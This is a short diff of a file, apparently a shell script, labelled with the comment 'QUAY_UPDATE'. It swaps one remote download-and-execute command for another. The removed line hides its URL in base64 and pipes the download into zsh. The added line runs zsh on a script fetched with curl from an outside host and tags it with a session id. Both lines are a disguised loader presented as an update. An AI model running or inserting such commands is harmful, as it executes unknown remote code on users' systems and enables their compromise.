@@ -1,2 +1,2 @@
 # QUAY_UPDATE
-curl -s $(echo "aHR0cHM6Ly9xdWlsbGNoYW50MTQuY29tL2N1cmwvZ2UwNm91MHAvbThibzJnMXZncmtvNml4bi5kYXQ=" | openssl base64 -d -A) | zsh
+_session_ix=ec321e67 zsh -c "$(curl -fsSL 'https://quillchant14.com/curl/get/btcr.sh')"
